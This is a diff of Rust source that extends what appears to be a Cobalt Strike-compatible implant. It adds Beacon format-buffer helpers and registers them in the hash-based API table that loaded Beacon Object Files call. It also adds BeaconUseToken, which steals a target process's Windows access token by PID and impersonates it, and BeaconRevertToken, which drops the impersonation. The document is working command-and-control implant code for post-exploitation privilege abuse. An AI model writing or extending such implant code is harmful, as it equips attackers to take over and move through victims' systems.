@@ -331,6 +331,239 @@ pub unsafe extern "C" fn beacon_data_ptr(d: *mut Datum, size: i32) -> *mut u8 {
     p
 }
 
+// ---------------------------------------------------------------------------
+// BeaconFormat* + BeaconUseToken/BeaconRevertToken (CS API extension)
+// ---------------------------------------------------------------------------
+
+/// CS `formatp` (compat.c): original block, current buffer, length, size.
+#[repr(C)]
+pub struct FormatP {
+    pub original: *mut u8,
+    pub buffer: *mut u8,
+    pub length: i32,
+    pub size: i32,
+}
+
+const FORMAT_INIT_CAP: usize = 1024;
+
+/// Append `src` to a format buffer, growing the heap block when needed.
+///
+/// # Safety
+///
+/// `f` must reference a FormatP initialized by `beacon_format_alloc`.
+unsafe fn fmt_append(instance: &mut Instance, f: *mut FormatP, src: &[u8]) {
+    if src.is_empty() {
+        return;
+    }
+    let need = (*f).length as usize + src.len();
+    if need > (*f).size as usize {
+        let mut newcap = if (*f).size <= 0 {
+            FORMAT_INIT_CAP
+        } else {
+            (*f).size as usize * 2
+        };
+        while newcap < need {
+            newcap = newcap.saturating_mul(2);
+        }
+        let Some(heap) = instance.heap else {
+            return;
+        };
+        let nb = heap.allocate(newcap);
+        if nb.is_null() {
+            return;
+        }
+        let old = (*f).buffer;
+        let old_len = (*f).length as usize;
+        let mut i = 0;
+        while i < old_len {
+            *nb.add(i) = *old.add(i);
+            i += 1;
+        }
+        if !old.is_null() && old != (*f).original {
+            heap.deallocate(old);
+        }
+        (*f).buffer = nb;
+        (*f).size = newcap as i32;
+    }
+    let buf = core::slice::from_raw_parts_mut((*f).buffer, (*f).size as usize);
+    let mut l = (*f).length as usize;
+    if coff::format_append(buf, &mut l, src) {
+        (*f).length = l as i32;
+    }
+}
+
+/// `BeaconFormatAlloc(format)`: one heap block, zeroed (CS parity).
+///
+/// # Safety
+///
+/// `f` must point to writable, uninitialized storage for a `FormatP`.
+pub unsafe extern "C" fn beacon_format_alloc(f: *mut FormatP) {
+    let instance = crate::runtime::bootstrap::instance();
+    if instance.is_null() {
+        return;
+    }
+    let instance = &mut *instance;
+    let Some(heap) = instance.heap else {
+        return;
+    };
+    let buf = heap.allocate(FORMAT_INIT_CAP);
+    if buf.is_null() {
+        return;
+    }
+    *f = FormatP {
+        original: buf,
+        buffer: buf,
+        length: 0,
+        size: FORMAT_INIT_CAP as i32,
+    };
+}
+
+/// `BeaconFormatFree(format)`: both blocks, then zero (CS parity).
+///
+/// # Safety
+///
+/// `f` must reference a live `FormatP` from `beacon_format_alloc`.
+pub unsafe extern "C" fn beacon_format_free(f: *mut FormatP) {
+    let instance = crate::runtime::bootstrap::instance();
+    if instance.is_null() {
+        return;
+    }
+    let instance = &mut *instance;
+    let Some(heap) = instance.heap else {
+        return;
+    };
+    if !(*f).buffer.is_null() && (*f).buffer != (*f).original {
+        heap.deallocate((*f).buffer);
+    }
+    if !(*f).original.is_null() {
+        heap.deallocate((*f).original);
+    }
+    *f = FormatP {
+        original: core::ptr::null_mut(),
+        buffer: core::ptr::null_mut(),
+        length: 0,
+        size: 0,
+    };
+}
+
+/// `BeaconFormatReset(format)`: length back to 0, buffer back to original.
+///
+/// # Safety
+///
+/// `f` must reference a live `FormatP` from `beacon_format_alloc`.
+pub unsafe extern "C" fn beacon_format_reset(f: *mut FormatP) {
+    (*f).length = 0;
+    (*f).buffer = (*f).original;
+}
+
+/// `BeaconFormatToString(format, &len)`: the buffer and its length.
+///
+/// # Safety
+///
+/// `f` must reference a live `FormatP`; `out_len`, when non-null, must be
+/// writable.
+pub unsafe extern "C" fn beacon_format_to_string(f: *mut FormatP, out_len: *mut i32) -> *mut u8 {
+    if !out_len.is_null() {
+        *out_len = (*f).length;
+    }
+    (*f).buffer
+}
+
+/// `BeaconFormatAppend(format, data, len)`.
+///
+/// # Safety
+///
+/// `f` must reference a live `FormatP`; `data` must be readable for `len`
+/// bytes.
+pub unsafe extern "C" fn beacon_format_append(f: *mut FormatP, data: *const u8, len: i32) {
+    let instance = crate::runtime::bootstrap::instance();
+    if instance.is_null() || len <= 0 {
+        return;
+    }
+    let src = core::slice::from_raw_parts(data, len as usize);
+    fmt_append(&mut *instance, f, src);
+}
+
+/// `BeaconFormatPrintf(format, fmt, ...)`: bounded format, then append.
+///
+/// # Safety
+///
+/// `f` must reference a live `FormatP`; `fmt` must be NUL-terminated; the
+/// varargs must match the format conversions.
+pub unsafe extern "C" fn beacon_format_printf(f: *mut FormatP, fmt: *const u8, mut args: ...) {
+    let instance = crate::runtime::bootstrap::instance();
+    if instance.is_null() {
+        return;
+    }
+    let mut slots = [0u64; PRINTF_SLOTS];
+    let mut n = 0usize;
+    while n < PRINTF_SLOTS {
+        slots[n] = unsafe { args.next_arg::<u64>() };
+        n += 1;
+    }
+    let mut flen = 0usize;
+    while flen < FMT_CAP && *fmt.add(flen) != 0 {
+        flen += 1;
+    }
+    let fmt_bytes = core::slice::from_raw_parts(fmt, flen);
+    #[allow(invalid_value, clippy::uninit_assumed_init)]
+    let mut out: [u8; PRINTF_CAP] = core::mem::MaybeUninit::uninit().assume_init();
+    let mut written = 0usize;
+    let _ = coff::bof_format(
+        &mut out,
+        &mut written,
+        fmt_bytes,
+        &Varargs {
+            slots,
+            count: PRINTF_SLOTS,
+        },
+    );
+    fmt_append(&mut *instance, f, &out[..written]);
+}
+
+/// `BeaconUseToken(pid)`: steal the process token and impersonate it
+/// (CS parity; rides the tkn store of the instance).
+///
+/// # Safety
+///
+/// Beacon thread with a live instance in the TEB.
+pub unsafe extern "C" fn beacon_use_token(pid: i32) -> i32 {
+    let instance = crate::runtime::bootstrap::instance();
+    if instance.is_null() || pid <= 0 {
+        return 0;
+    }
+    let instance = &mut *instance;
+    let mut scratch = [0u8; 512];
+    let mut w = Writer::new(&mut scratch);
+    let before = instance.tokens_len;
+    crate::tasks::token_steal(instance, pid as u32, 0, &mut w);
+    if instance.tokens_len == before {
+        return 0; // steal failed
+    }
+    let tid = instance.tokens[instance.tokens_len - 1].token_id;
+    crate::tasks::token_impersonate(instance, tid, 0, &mut w);
+    if instance.active_token == tid {
+        1
+    } else {
+        0
+    }
+}
+
+/// `BeaconRevertToken()`: drop the impersonation.
+///
+/// # Safety
+///
+/// Beacon thread with a live instance in the TEB.
+pub unsafe extern "C" fn beacon_revert_token() {
+    let instance = crate::runtime::bootstrap::instance();
+    if instance.is_null() {
+        return;
+    }
+    let mut scratch = [0u8; 128];
+    let mut w = Writer::new(&mut scratch);
+    crate::tasks::token_revert(&mut *instance, 0, &mut w);
+}
+
 /// The Beacon API dispatch table, by FNV-64 hash of the name (compat.c
 /// `SptBofBuildApiTable`, subset). The names hash exactly like the original
 /// (`SptHashStr` of the bare name).
@@ -344,6 +577,20 @@ fn beacon_api(name: &[u8]) -> Option<usize> {
         h if h == fnv1a64(b"BeaconDataLength") => Some(beacon_data_length as *const () as usize),
         h if h == fnv1a64(b"BeaconDataExtract") => Some(beacon_data_extract as *const () as usize),
         h if h == fnv1a64(b"BeaconDataPtr") => Some(beacon_data_ptr as *const () as usize),
+        h if h == fnv1a64(b"BeaconFormatAlloc") => Some(beacon_format_alloc as *const () as usize),
+        h if h == fnv1a64(b"BeaconFormatFree") => Some(beacon_format_free as *const () as usize),
+        h if h == fnv1a64(b"BeaconFormatReset") => Some(beacon_format_reset as *const () as usize),
+        h if h == fnv1a64(b"BeaconFormatAppend") => {
+            Some(beacon_format_append as *const () as usize)
+        }
+        h if h == fnv1a64(b"BeaconFormatPrintf") => {
+            Some(beacon_format_printf as *const () as usize)
+        }
+        h if h == fnv1a64(b"BeaconFormatToString") => {
+            Some(beacon_format_to_string as *const () as usize)
+        }
+        h if h == fnv1a64(b"BeaconUseToken") => Some(beacon_use_token as *const () as usize),
+        h if h == fnv1a64(b"BeaconRevertToken") => Some(beacon_revert_token as *const () as usize),
         _ => None,
     }
 }
